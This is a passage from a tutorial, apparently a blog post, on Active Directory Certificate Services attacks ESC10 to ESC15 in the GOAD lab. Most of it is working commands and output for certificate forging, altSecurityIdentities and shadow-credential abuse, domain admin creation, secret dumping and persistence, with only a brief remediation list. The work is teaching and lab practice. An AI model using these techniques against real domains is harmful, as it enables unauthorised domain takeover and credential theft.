settings\u003c/li\u003e\n\u003cli\u003eAllows certificate authentication with partial subject matching\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003eExploitation Example\u003c/h3\u003e\n\u003cp\u003eLet's try ESC10A in GOAD:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# ESC10A - Modify altSecurityIdentities attribute\n# First, create a computer account and request machine certificate\naddcomputer.py -computer-name 'EVIL$' -computer-pass 'Password123!' essos/missandei:fr3edom@meereen.essos.local\n\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Successfully added machine account EVIL$ with password Password123!.\n\n# Request machine certificate for our new computer\nCertify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:Machine /machine\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\EVIL$\n[*] Template                : Machine\n[*] Subject                 : CN=EVIL, CN=Computers, DC=essos, DC=local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 18\n\n# Extract certificate details (issuer, serial number)\ncertutil -dump evil.pem\n\nCertificate:\n    Serial Number: 6100000028f9b2d3c5a1b4e87a00000000000028\n    Issuer: CN=ESSOS-CA, DC=essos, DC=local\n    Subject: CN=EVIL, CN=Computers, DC=essos, DC=local\n\n# Modify target user's altSecurityIdentities to map to our certificate\n$dn = \"CN=administrator,CN=Users,DC=essos,DC=local\"\n$mapping = \"X509:\u0026#x3C;I\u003eCN=ESSOS-CA,DC=essos,DC=local\u0026#x3C;S\u003e6100000028f9b2d3c5a1b4e87a00000000000028\"\nSet-ADObject -Identity $dn -Replace @{'altSecurityIdentities' = $mapping}\n\n# Authenticate as administrator using our EVIL$ machine certificate\n\nRubeus.exe asktgt /user:administrator /certificate:evil.pfx /password:Password123!\n\n[*] Action: Ask TGT\n[*] Using certificate mapping via altSecurityIdentities\n[*] Using PKINIT with etype rc4_hmac and subject: CN=EVIL, CN=Computers, DC=essos, DC=local\n[+] TGT request successful!\n\n  UserName                 : administrator\n  UserRealm                : ESSOS.LOCAL\n  ServiceName              : krbtgt/essos.local\n  ServiceRealm             : ESSOS.LOCAL\n  StartTime                : 1/3/2025 6:45:12 PM\n  EndTime                  : 1/4/2025 4:45:12 AM\n  RenewTill                : 1/10/2025 6:45:12 PM\n  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ePerfect! We've successfully used ESC10A to authenticate as administrator using a machine certificate mapped via \u003ccode\u003ealtSecurityIdentities\u003c/code\u003e.\u003c/p\u003e\n\u003ch2\u003eESC11: IF_ENFORCEENCRYPTICERTREQUEST\u003c/h2\u003e\n\u003cp\u003eESC11 targets CAs configured with IF_ENFORCEENCRYPTICERTREQUEST flag, which can be bypassed under certain conditions.\u003c/p\u003e\n\u003ch3\u003eAttack Vector\u003c/h3\u003e\n\u003cp\u003eESC11 exploits RPC call tampering when certificate requests are transmitted unencrypted to the Certificate Authority.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eImportant:\u003c/strong\u003e The \"unencrypted request\" only succeeds when the CA has \u003ccode\u003eIF_ENFORCEENCRYPTICERTREQUEST\u003c/code\u003e cleared. If this flag is set (the secure default on modern Windows versions), the RPC interface forces packet privacy and NTLM relay fails.\u003c/p\u003e\n\u003ch3\u003ePrerequisites\u003c/h3\u003e\n\u003cp\u003eLet's check the GOAD CA configuration. Check if CA has IF_ENFORCEENCRYPTICERTREQUEST flag cleared:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003ecertutil -config \"braavos.essos.local\\ESSOS-CA\" -getreg CA\\InterfaceFlags\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\ESSOS-CA\\InterfaceFlags REG_DWORD = 0x0 (0)\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eH0x0 = vulnerable (no encryption required), 0x200 = hardened (encryption required). IF_ENFORCEENCRYPTICERTREQUEST is NOT set (flag would be 0x200) - this makes the CA vulnerable to ESC11.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eCA has IF_ENFORCEENCRYPTICERTREQUEST flag cleared\u003c/strong\u003e ✓\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUnencrypted certificate request\u003c/strong\u003e ✓\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eBypass Technique\u003c/h3\u003e\n\u003cpre class=\"language-csharp\"\u003e\u003ccode class=\"language-csharp\"\u003e// Create unencrypted certificate request for GOAD environment\npublic class ESC11Exploit\n{\n    public string CreateUnencryptedRequest(string subject, string altname = \"administrator@essos.local\")\n    {\n        var request = new CX509CertificateRequestPkcs10();\n        var privateKey = new CX509PrivateKey();\n        \n        // Configure for unencrypted submission to GOAD CA\n        privateKey.ProviderName = \"Microsoft Software Key Storage Provider\";\n        privateKey.Create();\n        \n        request.InitializeFromPrivateKey(\n            X509CertificateEnrollmentContext.ContextUser,\n            privateKey,\n            \"\");\n            \n        request.Subject = new CX500DistinguishedName(subject);\n        \n        // Add SAN for GOAD domain\n        var sanExtension = new CX509ExtensionAlternativeNames();\n        var altNames = new CAlternativeNames();\n        var altNameObj = new CAlternativeName();\n        \n        altNameObj.InitializeFromString(\n            AlternativeNameType.XCN_CERT_ALT_NAME_RFC822_NAME,\n            altname);\n        altNames.Add(altNameObj);\n        \n        sanExtension.InitializeEncode(altNames);\n        request.X509Extensions.Add(sanExtension);\n        \n        // Submit without encryption to vulnerable GOAD CA\n        return request.Encode();\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe C# code above demonstrates how a certificate request (CSR) payload can be constructed. For the actual ESC11 attack, an attacker would typically use a tool like an adapted \u003ccode\u003entlmrelayx.py\u003c/code\u003e or custom tooling to relay incoming NTLM authentication (e.g., from a coerced machine account) to the ADCS server's \u003ccode\u003eICertRequestD\u003c/code\u003e DCOM interface over unencrypted RPC. Once the NTLM relay is established, the attacker's tool submits the CSR (like the one generated above, often for a privileged account or a machine account with a useful SAN) on behalf of the relayed account. If successful, the CA issues the certificate for the target specified in the CSR, effectively escalating privileges.\u003c/p\u003e\n\u003ch2\u003eESC12: Shell Access to CA Server\u003c/h2\u003e\n\u003cp\u003eESC12 is the holy grail - when you get shell access to the actual Certificate Authority server. At this point, you basically own the entire PKI infrastructure.\u003c/p\u003e\n\u003cp\u003eESC12 also covers YubiHSM vulnerabilities discovered by Hans-Joachim Knobloch, but this specific attack vector is not implemented in the standard GOAD environment.\u003c/p\u003e\n\u003cp\u003eIn GOAD, the CA server is \u003ccode\u003ebraavos.essos.local\u003c/code\u003e. Let's say we've compromised it:\u003c/p\u003e\n\u003ch3\u003eGolden Certificate Creation (CA Private Key Compromise)\u003c/h3\u003e\n\u003cp\u003eWhen you have CA administrator access (like \u003ccode\u003ekhal.drogo\u003c/code\u003e in GOAD), you can extract the CA private key and forge golden certificates:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# Extract CA certificate and private key with certipy\ncertipy ca -backup -u khal.drogo@essos.local -p horse -dc-ip 192.168.56.12 -ca 'ESSOS-CA' -target 192.168.56.23 -debug\n\n[*] Action: Backup CA\n[*] Backing up CA 'ESSOS-CA'\n[*] Saved certificate and private key to 'ESSOS-CA.pfx'\n\n# Forge a certificate as domain admin\ncertipy forge -ca-pfx 'ESSOS-CA.pfx' -upn administrator@essos.local\n\n[*] Action: Forge Certificate\n[*] Forged certificate saved to 'administrator_forged.pfx'\n\n# Authenticate with schannel\ncertipy auth -pfx administrator_forged.pfx -ldap-shell\n\n[*] Action: Authenticate\n[*] LDAP shell available\n\n# add_user newdomainadmin\n# add_user_to_group newdomainadmin \"Domain admins\"\n\n# Alternative: Authenticate with PKINIT\n# First request a valid certificate as template\ncertipy req -u 'khal.drogo@essos.local' -p horse -ca 'ESSOS-CA' -template User -target 192.168.56.23\n\n# Reforge with template to fix CRL issues\ncertipy forge -ca-pfx 'ESSOS-CA.pfx' -upn administrator@essos.local -template khal.drogo.pfx\n\n\nRubeus.exe asktgt /user:administrator /certificate:administrator_forged.pfx /password:mimikatz\n\n# Or use gettgtpkinit.py\ngettgtpkinit.py -cert-pfx administrator_forged.pfx -dc-ip 192.168.56.12 \"essos.local/administrator\" admin_tgt.cccache\n\nexport KRB5CCNAME=/workspace/admin_tgt.cccache\nsecretsdump.py -k meereen.essos.local -dc-ip 192.168.56.12\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003ePost-Exploitation Techniques\u003c/h3\u003e\n\u003ch2\u003eESC13: Issuance Policy OID Group Links\u003c/h2\u003e\n\u003cp\u003eESC13 exploits the ADCS feature where certificate templates can have issuance policies with OID group links to Active Directory groups. This allows principals to gain access as members of linked groups by requesting certificates with the appropriate issuance policies.\u003c/p\u003e\n\u003ch3\u003eTechnical Details\u003c/h3\u003e\n\u003cp\u003eThis attack abuses Microsoft's Authentication Mechanism Assurance (AMA) feature where:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCertificate templates contain issuance policies (stored in \u003ccode\u003emsPKI-Certificate-Policy\u003c/code\u003e attribute)\u003c/li\u003e\n\u003cli\u003eIssuance policies can be linked to AD groups via \u003ccode\u003emsDS-OIDToGroupLink\u003c/code\u003e attribute\u003c/li\u003e\n\u003cli\u003eWhen authenticating with such certificates, users gain group membership permissions\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003eRequirements\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003ePrincipal has enrollment rights\u003c/strong\u003e on a certificate template\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCertificate template has an issuance policy extension\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eIssuance policies can be linked to AD groups via \u003ccode\u003emsDS-OIDToGroupLink\u003c/code\u003e attribute\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eNo issuance requirements\u003c/strong\u003e the principal cannot meet\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eEKUs enable client authentication\u003c/strong\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eExploitation Process\u003c/h3\u003e\n\u003cp\u003eLet's check for ESC13 conditions in GOAD:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# Find templates with issuance policies linked to groups in essos.local\nImport-Module ActiveDirectory\n\n$templates = Get-ADObject -Filter 'objectClass -eq \"pKICertificateTemplate\"' -Properties msPKI-Certificate-Policy -SearchBase \"CN=Configuration,DC=essos,DC=local\"\n\nforeach ($template in $templates) {\n    if ($template.'msPKI-Certificate-Policy') {\n        $policies = $template.'msPKI-Certificate-Policy'\n        foreach ($policy in $policies) {\n            $oid = Get-ADObject -Filter * -SearchBase \"CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local\" -Properties msDS-OIDToGroupLink | Where-Object {$_.msDS-OIDToGroupLink -and $policy -eq $_.'msPKI-Cert-Template-OID'}\n            if ($oid.'msDS-OIDToGroupLink') {\n                Write-Host \"Template $($template.Name) linked to group: $($oid.'msDS-OIDToGroupLink')\"\n            }\n        }\n    }\n}\n\nTemplate ESC13Template linked to group: CN=Enterprise Admins,CN=Users,DC=essos,DC=local\n\n# Perfect! ESC13Template is linked to Enterprise Admins\n\n# Request certificate from vulnerable template\nCertify.exe request /ca:braavos.essos.local\\ESSOS-CA /template:ESC13Template\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\missandei\n[*] Template                : ESC13Template\n[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 17\n\n# Authenticate with certificate to gain Enterprise Admin group membership\n\nRubeus.exe asktgt /user:missandei /certificate:esc13.pfx /password:mimikatz\n\n[*] Action: Ask TGT\n[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local\n[+] TGT request successful!\n\n# The TGT now contains Enterprise Admins group membership!\n# Verify with whoami /groups after using the ticket\n\nRubeus.exe ptt /ticket:doIFujCCBbagAwIBBaEDAgEWooIEwjCCBL5hggS6...\n\n[*] Action: Import Ticket\n[+] Ticket successfully imported!\n\n# Now we have Enterprise Admin privileges in the forest\nnet group \"Enterprise Admins\" /domain\n\nGroup name     Enterprise Admins\nComment        Designated administrators of the enterprise\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator  missandei\nThe command completed successfully.\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eGroup Requirements\u003c/h3\u003e\n\u003cp\u003eThe linked group must be:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eEmpty\u003c/strong\u003e (no actual members)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUniversal scope\u003c/strong\u003e (forest-wide)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCommon universal groups include Enterprise Admins, Schema Admins, Enterprise Key Admins.\u003c/p\u003e\n\u003ch2\u003eESC14: Shadow Credentials and Advanced Certificate Mapping\u003c/h2\u003e\n\u003cp\u003eESC14 represents advanced certificate mapping abuse techniques that go beyond basic \u003ccode\u003ealtSecurityIdentities\u003c/code\u003e manipulation covered in ESC10. This technique focuses on shadow credentials and sophisticated certificate-to-account mapping scenarios.\u003c/p\u003e\n\u003ch3\u003eTechnical Background\u003c/h3\u003e\n\u003cp\u003eESC14 exploits advanced certificate mapping mechanisms including:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eShadow Credentials\u003c/strong\u003e: Abusing \u003ccode\u003emsDS-KeyCredentialLink\u003c/code\u003e attribute for certificate-based authentication\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAdvanced Certificate Mapping\u003c/strong\u003e: Sophisticated manipulation of certificate-to-account relationships\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCross-Domain Certificate Abuse\u003c/strong\u003e: Exploiting certificate mappings across domain boundaries\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003eAttack Scenarios\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eESC14A - Shadow Credentials Abuse:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAttackers with write permissions on user objects can add shadow credentials\u003c/li\u003e\n\u003cli\u003eAllows certificate-based authentication without traditional certificate enrollment\u003c/li\u003e\n\u003cli\u003eBypasses many traditional ADCS controls\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eESC14B - Advanced Certificate Mapping:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSophisticated certificate mapping scenarios beyond basic ESC10 techniques\u003c/li\u003e\n\u003cli\u003eCross-domain certificate abuse in multi-domain environments like GOAD\u003c/li\u003e\n\u003cli\u003eCertificate mapping persistence mechanisms\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003eExploitation Process\u003c/h3\u003e\n\u003cp\u003eLet's demonstrate ESC14 techniques in our GOAD environment. ESC14A - altSecurityIdentities Manipulation in GOAD:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# First, create a computer account for certificate mapping\naddcomputer.py -method ldaps -computer-name 'esc14computer$' -computer-pass 'Il0veCertific@te' -dc-ip 192.168.56.12 essos/missandei:fr3edom@192.168.56.12\n\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Successfully added machine account esc14computer$ with password Il0veCertific@te.\n\n# Request machine certificate for our created computer\ncertipy req -target braavos.essos.local -u 'esc14computer$@essos.local' -p 'Il0veCertific@te' -dc-ip 192.168.56.12 -template Machine -ca ESSOS-CA -debug\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\esc14computer$\n[*] Template                : Machine\n[*] Subject                 : CN=esc14computer, CN=Computers, DC=essos, DC=local\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 25\n\n# Extract certificate details for mapping\ncertipy cert -pfx esc14computer.pfx -nokey -out \"esc14computer.crt\"\nopenssl x509 -in esc14computer.crt -noout -text\n\nCertificate:\n    Data:\n        Serial Number: 43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11\n        Issuer: CN=ESSOS-CA, DC=essos, DC=local\n        Subject: CN=esc14computer, CN=Computers, DC=essos, DC=local\n\n# Check current altSecurityIdentities\nldeep ldap -u missandei -d essos.local -p fr3edom -s ldap://192.168.56.12 search '(samaccountname=khal.drogo)' altSecurityIdentities\n\n[{\n  \"altSecurityIdentities\": [],\n  \"dn\": \"CN=khal.drogo,CN=Users,DC=essos,DC=local\"\n}]\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eX509 Certificate Mapping Format\u003c/h3\u003e\n\u003cp\u003eThe reference article provides a Python script to format the X509 mapping correctly:\u003c/p\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003eimport argparse\n\ndef get_x509_issuer_serial_number_format(serial_number: str, issuer_distinguished_name: str) -\u003e str:\n    \"\"\"\n    Formats the X509IssuerSerialNumber for the altSecurityIdentities attribute.\n    :param serial_number: Serial number in the format \"43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11\"\n    :param issuer_distinguished_name: Issuer distinguished name, e.g., \"CN=ESSOS-CA,DC=essos,DC=local\"\n    :return: Formatted X509IssuerSerialNumber\n    \"\"\"\n    serial_bytes = serial_number.split(\":\")\n    reversed_serial_number = \"\".join(reversed(serial_bytes))\n    issuer_components = issuer_distinguished_name.split(\",\")\n    reversed_issuer_components = \",\".join(reversed(issuer_components))\n    return f\"X509:\u0026#x3C;I\u003e{reversed_issuer_components}\u0026#x3C;SR\u003e{reversed_serial_number}\"\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser(description=\"Format X509 Issuer Serial Number\")\n    parser.add_argument(\"-serial\", required=True, help=\"Serial number in format 43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11\")\n    parser.add_argument(\"-issuer\", required=True, help=\"Issuer Distinguished Name e.g., CN=ESSOS-CA,DC=essos,DC=local\")\n\n    args = parser.parse_args()\n    formatted_value = get_x509_issuer_serial_number_format(args.serial, args.issuer)\n    print(formatted_value)\n\n# Usage:\npython3 x509_issuer_serial_number_format.py -serial \"43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11\" -issuer \"CN=ESSOS-CA,DC=essos,DC=local\"\n\nX509:\u0026#x3C;I\u003eDC=local,DC=essos,CN=ESSOS-CA\u0026#x3C;SR\u003e110000000000a68816e592b078921100000043\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eLDAP Attribute Modification\u003c/h3\u003e\n\u003cp\u003eScript to modify altSecurityIdentities attribute:\u003c/p\u003e\n\u003cpre class=\"language-python\"\u003e\u003ccode class=\"language-python\"\u003eimport ldap3\n\ndn = \"CN=khal.drogo,CN=Users,DC=essos,DC=local\"\nuser = \"essos.local\\\\missandei\"\npassword = \"fr3edom\"\nserver = ldap3.Server('meereen.essos.local')\nldap_con = ldap3.Connection(server=server, user=user, password=password, authentication=ldap3.NTLM)\nldap_con.bind()\n\n# Set the certificate mapping\nldap_con.modify(dn, {\n    'altSecurityIdentities': [(ldap3.MODIFY_REPLACE, 'X509:\u0026#x3C;I\u003eDC=local,DC=essos,CN=ESSOS-CA\u0026#x3C;SR\u003e110000000000a68816e592b078921100000043')]\n})\n\nprint(ldap_con.result)\nldap_con.unbind()\n\n# Verify the mapping was set\nldeep ldap -u missandei -d essos.local -p fr3edom -s ldap://192.168.56.12 search '(samaccountname=khal.drogo)' altSecurityIdentities\n\n[{\n  \"altSecurityIdentities\": [\n    \"X509:\u0026#x3C;I\u003eDC=local,DC=essos,CN=ESSOS-CA\u0026#x3C;SR\u003e110000000000a68816e592b078921100000043\"\n  ],\n  \"dn\": \"CN=khal.drogo,CN=Users,DC=essos,DC=local\"\n}]\n\n# Authenticate as khal.drogo using our machine certificate!\ngettgtpkinit.py -cert-pfx esc14computer.pfx -dc-ip 192.168.56.12 \"essos.local/khal.drogo\" khal_tgt.ccache\n\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Requesting TGT for khal.drogo@essos.local using Kerberos PKINIT\n[+] TGT request successful!\n[*] Saved TGT to khal_tgt.ccache\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eAdvanced Persistence with ESC14\u003c/h3\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# ESC14 Persistence - Shadow Credentials for Domain Admin\n# Add shadow credentials to Domain Admin account (if we have permissions)\npython3 pywhisker.py -d essos.local -u khal.drogo -p horse --target administrator --action add --dc-ip 192.168.56.12\n\n[*] Target user found: CN=Administrator,CN=Users,DC=essos,DC=local\n[*] Adding KeyCredential to the target object\n[+] Updated the msDS-KeyCredentialLink attribute of the target object\n[*] Saved certificate to administrator_shadow.crt\n[*] Saved private key to administrator_shadow.pem\n\n# This provides persistent access to Domain Admin even after password changes\ngettgtpkinit.py -cert-pem administrator_shadow.pem -key-pem administrator_shadow.pem essos.local/administrator admin_shadow.ccache\n\n# ESC14 Advanced Mapping - Multiple Certificate Mappings\n# Add multiple certificate mappings for redundancy\n$certificates = @(\n    \"X509:\u0026#x3C;I\u003eDC=local,DC=essos,CN=ESSOS-CA\u0026#x3C;SR\u003e6100000000001a68816e592b078921100000043\",\n    \"X509:\u0026#x3C;I\u003eDC=local,DC=essos,CN=ESSOS-CA\u0026#x3C;SR\u003e6100000000001a68816e592b078921100000044\",\n    \"X509:\u0026#x3C;I\u003eDC=local,DC=essos,CN=ESSOS-CA\u0026#x3C;SR\u003e6100000000001a68816e592b078921100000045\"\n)\n\nforeach ($cert in $certificates) {\n    $currentMappings = (Get-ADUser administrator -Properties altSecurityIdentities).altSecurityIdentities\n    $newMappings = $currentMappings + $cert\n    Set-ADUser administrator -Replace @{'altSecurityIdentities' = $newMappings}\n}\n\n# Verify multiple mappings\nGet-ADUser administrator -Properties altSecurityIdentities | Select-Object -ExpandProperty altSecurityIdentities\n\nX509:\u0026#x3C;I\u003eDC=local,DC=essos,CN=ESSOS-CA\u0026#x3C;SR\u003e6100000000001a68816e592b078921100000043\nX509:\u0026#x3C;I\u003eDC=local,DC=essos,CN=ESSOS-CA\u0026#x3C;SR\u003e6100000000001a68816e592b078921100000044\nX509:\u0026#x3C;I\u003eDC=local,DC=essos,CN=ESSOS-CA\u0026#x3C;SR\u003e6100000000001a68816e592b078921100000045\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eKey Differences from ESC10\u003c/h3\u003e\n\u003cp\u003eESC14 differs from ESC10 in several important ways:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eShadow Credentials\u003c/strong\u003e: Uses \u003ccode\u003emsDS-KeyCredentialLink\u003c/code\u003e instead of traditional certificate enrollment\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCross-Domain Abuse\u003c/strong\u003e: Sophisticated mapping across domain boundaries\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAdvanced Persistence\u003c/strong\u003e: Multiple mapping techniques for redundancy\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBypasses Traditional Controls\u003c/strong\u003e: Works around many ADCS security measures\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003eRemediation\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eMonitor Key Attributes\u003c/strong\u003e: Watch for changes to \u003ccode\u003emsDS-KeyCredentialLink\u003c/code\u003e and \u003ccode\u003ealtSecurityIdentities\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRestrict Permissions\u003c/strong\u003e: Limit write access to user objects, especially high-privilege accounts\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCross-Domain Hardening\u003c/strong\u003e: Implement strict certificate mapping validation across domain boundaries\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRegular Audits\u003c/strong\u003e: Periodically audit certificate mappings and shadow credentials\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eESC15: Version 1 Template Application Policies (CVE-2024-49019)\u003c/h2\u003e\n\u003cp\u003eESC15, also known as \"EKUwu\", exploits a vulnerability in version 1 certificate templates where attackers can specify arbitrary Application Policies in certificate requests, overriding the template's intended Extended Key Usage. This vulnerability was discovered by Justin Bollinger from TrustedSec and reported to Microsoft in October 2024.\u003c/p\u003e\n\u003ch3\u003eTechnical Background\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eApplication Policies\u003c/strong\u003e (OID 1.3.6.1.4.1.311) are Microsoft's proprietary extension\u003c/li\u003e\n\u003cli\u003eWhen both Application Policy and EKU exist, \u003cstrong\u003eApplication Policy takes precedence\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003eVersion 1 templates don't validate Application Policy fields in requests\u003c/li\u003e\n\u003cli\u003eAttackers can add dangerous policies like Certificate Request Agent or Client Authentication\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003eVulnerability Conditions\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eVersion 1 certificate template\u003c/strong\u003e (schema version = 1)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTemplate allows \"Supply in the Request\"\u003c/strong\u003e subject specification\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePrincipal has enrollment rights\u003c/strong\u003e on the template\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eExploitation Process\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003eImportant:\u003c/strong\u003e The reference GOAD article shows ESC15 exploitation as a \u003cstrong\u003etwo-step process\u003c/strong\u003e using Certificate Request Agent capabilities:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# Step 1: Request certificate with Certificate Request Agent application policy\ncertipy req -u missandei@essos.local -p fr3edom --application-policies \"1.3.6.1.4.1.311.20.2.1\" -ca ESSOS-CA -template WebServer -dc-ip 192.168.56.12 -target braavos.essos.local\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\missandei\n[*] Template                : WebServer (vulnerable version 1)\n[*] Application Policy      : Certificate Request Agent (1.3.6.1.4.1.311.20.2.1)\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 19\n\n# Step 2: Use Certificate Request Agent certificate to request admin certificate on-behalf-of\ncertipy req -u missandei@essos.local -on-behalf-of essos\\\\administrator -template User -ca ESSOS-CA -pfx missandei.pfx -dc-ip 192.168.56.12 -target braavos.essos.local\n\n[*] Action: Request a Certificates\n[*] Current user context    : ESSOS\\missandei\n[*] Template                : User\n[*] On behalf of            : essos\\administrator\n[*] Using Certificate Request Agent certificate\n\n[*] Certificate Authority   : braavos.essos.local\\ESSOS-CA\n[*] CA Response             : The certificate has been issued.\n[*] Request ID              : 20\n\n# Step 3: Authenticate as administrator\n\nRubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:mimikatz\n\n[*] Action: Ask TGT\n[*] Using PKINIT with etype rc4_hmac and subject: CN=administrator, CN=Users, DC=essos, DC=local\n[+] TGT request successful!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eAlternative Method (Direct Application Policy Override):\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eESC15 Exploitation Example - Method 1: Using certreq with custom INF file:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e$infContent = @\"\n[NewRequest]\nSubject = \"CN=missandei,CN=Users,DC=essos,DC=local\"\nKeyLength = 2048\nKeyAlgorithm = RSA\nMachineKeySet = FALSE\nRequestType = PKCS10\nCertificateTemplate = WebServer\n\n[Extensions]\n1.3.6.1.4.1.311.21.10 = \"{text}1.3.6.1.5.5.7.3.2\"\n2.5.29.17 = \"{text}upn=administrator@essos.local\"\n\"@\n\n$infContent | Out-File -FilePath \"esc15.inf\"\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003ecertreq -new -f esc15.inf esc15.req\ncertreq -submit -config \"braavos.essos.local\\ESSOS-CA\" esc15.req\n\nCertificate Request Processor: The request is taken under submission Request ID = 19\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eMethod 2: Using Certipy v5.0+ (if available with ESC15 support)\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ecertipy req -u missandei@essos.local -p fr3edom -ca ESSOS-CA -template WebServer -dc-ip 192.168.56.12 -target braavos.essos.local -upn administrator@essos.local -key-size 2048\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eThe attack works because version 1 templates don't validate Application Policy extensions and Application Policies override Extended Key Usage when both are present\u003c/p\u003e\n\u003cp\u003eRetrieve the issued certificate:\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ecertreq -retrieve 19 esc15.cer\u003c/code\u003e\n\u003ccode\u003ecertreq -accept esc15.cer\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eThe issued certificate will contain both:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eOriginal EKU: Server 